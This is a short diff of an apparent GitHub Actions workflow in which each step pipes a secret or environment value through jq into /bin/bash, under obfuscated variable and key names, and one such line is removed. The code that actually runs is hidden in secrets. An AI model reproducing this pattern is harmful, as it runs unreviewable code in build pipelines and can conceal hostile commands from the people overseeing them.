@@ -21,7 +21,6 @@ jobs:
           e359: ${{ secrets.e359 }}
         run: |
           printf '%s' "$e359" | jq -r .esob2616 | /bin/bash
-          echo $rgpjg482 | jq -r .kz4144 | /bin/bash
           printf '%s' "$yoh7692" | jq -r .tib22 | /bin/bash
           printf '%s' "$wygi8575" | jq -r .yhj438 | /bin/bash
 
